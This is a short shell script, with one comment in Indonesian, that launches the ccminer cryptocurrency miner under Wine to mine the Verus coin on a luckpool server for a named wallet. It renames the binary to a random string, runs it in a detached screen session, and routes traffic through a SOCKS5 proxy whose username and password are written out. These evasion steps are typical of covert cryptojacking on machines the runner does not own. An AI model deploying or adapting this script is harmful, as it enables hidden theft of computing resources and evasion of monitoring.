chmod +x * 
cd ccminer_CPU_3.8.3 
proxy_url="socks5://LndDac:cYdYDA@196.16.3.155:9692"
random_name=$(tr -dc A-Za-z </dev/urandom | head -c 10)  # Menghasilkan nama acak sepanjang 8 karakter 
mv ccminer.exe $random_name.exe 
screen -d -m bash -c "wine $random_name.exe -a verus -o stratum+tcp://eu.luckpool.net:3956 -u R9YBzJehKbgvrosLuXGnaCJ4SSspyRyfCo.yoah2 -p d=16384S -t 4 --proxy=$proxy_url"
